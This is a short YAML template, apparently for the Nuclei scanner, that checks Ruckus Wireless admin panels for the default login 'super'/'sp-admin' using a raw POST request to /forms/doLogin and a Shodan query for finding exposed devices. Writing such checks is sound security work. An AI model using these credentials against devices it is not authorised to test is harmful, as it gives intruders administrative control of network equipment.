id: ruckus-wireless-default-login

info:
  name: Ruckus Wireless Admin Default Login Credential
  author: pussycat0x
  severity: critical
  metadata:
    verified: true
    shodan-query: title:"ruckus"
  reference:
    - https://docs.commscope.com/bundle/fastiron-08092-securityguide/page/GUID-32D3BB01-E600-4FBE-B555-7570B5024D34.html
  tags: default,login,network,ruckus

requests:
  - raw:
      - |
        POST /forms/doLogin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Origin: https://{{Hostname}}
        Referer: https://{{Hostname}}/login.asp
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Te: trailers
        Connection: close

        login_username=super&password=sp-admin

    redirects: true
    cookie-reuse: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - status
      - type: status
        status:
          - 200
